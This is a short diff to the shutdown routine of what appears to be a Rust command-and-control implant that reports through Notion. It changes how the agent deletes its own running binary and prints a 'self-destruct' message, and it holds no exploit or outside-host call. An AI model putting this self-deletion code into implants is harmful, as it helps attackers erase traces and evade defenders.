@@ -27,14 +27,17 @@ pub async fn handle() -> Result<String, Box<dyn Error>> {
                 .collect();
 
                 houdini::disappear_with_placeholder(rand_string);
+                // Shutdown agent
+                // In main.rs, shutdown::handle exits the current running process
+                notion_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!")
         }
 
         #[cfg(not(windows))] {
                 let running_agent: String = args().nth(0).unwrap();
-                remove_file(running_agent)?;
+                match remove_file(running_agent) {
+                        Ok(_) => notion_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!"),
+                        Err(_) => notion_out!("[!] Couldn't delete, but killing the process anyway.")
+                }
         }
 
-        // Shutdown agent
-        // In main.rs, shutdown::handle exits the current running process
-        notion_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!")
 }
